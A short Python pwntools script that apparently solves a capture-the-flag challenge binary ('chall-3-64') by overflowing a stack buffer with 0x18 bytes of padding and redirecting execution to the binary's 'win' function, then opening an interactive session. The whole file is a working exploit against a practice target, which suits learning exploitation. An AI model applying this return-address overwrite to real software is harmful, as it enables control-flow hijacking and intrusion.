#!/usr/bin/env python3

from pwn import process, ELF, flat

io = process("./chall-3-64")

exe = ELF("./chall-3-64")

pad = 0x10 + 0x8

win = exe.symbols["win"]

payload = flat({
    pad: win
})

io.sendlineafter(b"Buf: ", payload)

io.interactive()
